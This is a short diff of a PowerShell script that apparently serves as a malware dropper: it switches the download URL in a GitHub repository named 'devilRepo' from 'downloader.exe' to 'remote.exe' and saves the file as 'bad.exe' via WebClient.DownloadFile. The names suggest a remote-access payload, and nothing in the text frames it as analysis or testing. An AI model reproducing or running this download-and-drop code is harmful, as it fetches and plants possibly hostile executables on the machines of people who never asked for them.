@@ -1,4 +1,4 @@
-$url_file = 'https://github.com/AlexGoProger/devilRepo/raw/refs/heads/main/downloader.exe' 
+$url_file = 'https://github.com/AlexGoProger/devilRepo/raw/refs/heads/main/remote.exe' 
 $file = 'bad.exe'
 
 PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file,$file), 
